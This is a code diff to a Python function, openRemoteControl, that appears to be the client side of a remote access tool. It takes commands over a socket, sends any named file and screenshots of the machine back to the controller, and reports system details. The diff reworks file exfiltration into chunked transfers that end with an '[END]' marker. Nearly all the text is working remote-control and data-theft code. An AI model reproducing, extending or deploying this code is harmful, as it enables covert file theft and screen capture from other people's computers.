@@ -223,25 +223,7 @@ def openRemoteControl(client):
             comando = client.recv(1024).decode(FORMAT)
             time.sleep(0.5)
 
-            if comando[0:8] == "download":
-                try:
-                    filename = comando[10:len(comando) - 1]
-                    filesize = os.path.getsize(filename)
-                    if filesize<=0:
-                        raise Exception
-                    else:
-                        with open(filename, 'rb') as f:
-                            line = f.read(filesize)
-                            client.send((str(filesize)).encode(FORMAT))
-                            time.sleep(4)
-                            client.send(line)
-                            f.close()
-                except:
-                    client.send(("[ERROR]").encode(FORMAT))
-
-                time.sleep(3)
-
-            elif comando[0:2] == "cd":
+            if comando[0:2] == "cd":
                 match= regexcheck_cd(comando)
 
                 if match:
@@ -305,6 +287,29 @@ def openRemoteControl(client):
                 infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                 client.send(((infos)).encode(FORMAT))
 
+            elif comando[0:8] == "download":
+                try:
+                    filename = comando[10:len(comando) - 1]
+                    filesize = os.path.getsize(filename)
+                    if filesize<=0:
+                        raise Exception
+                    else:
+                        with open(filename, 'rb') as f:
+                            time.sleep(4)
+                            line = f.read(1024)
+                            client.send(line)
+                            while (line):
+                                line = f.read(1024)
+                                client.send(line)
+
+                            time.sleep(2)
+                            client.send(("[END]").encode(FORMAT))
+                            f.close()
+                except:
+                    client.send(("[ERROR]").encode(FORMAT))
+
+                time.sleep(3)
+
             elif comando =="screenshot":
                 myScreenshot = pyautogui.screenshot()
                 if platform.system() == "Windows":
@@ -321,12 +326,18 @@ def openRemoteControl(client):
                         raise Exception
                     else:
                         with open(filename, 'rb') as f:
-                            line = f.read(filesize)
-                            client.send((str(filesize)).encode(FORMAT))
                             time.sleep(4)
+                            line = f.read(1024)
                             client.send(line)
+                            while(line):
+                                line = f.read(1024)
+                                client.send(line)
+
+                            time.sleep(2)
+                            client.send(("[END]").encode(FORMAT))
                             f.close()
                 except:
+                    traceback.print_exc()
                     client.send(("[ERROR]").encode(FORMAT))
 
                 os.remove("screen.png")
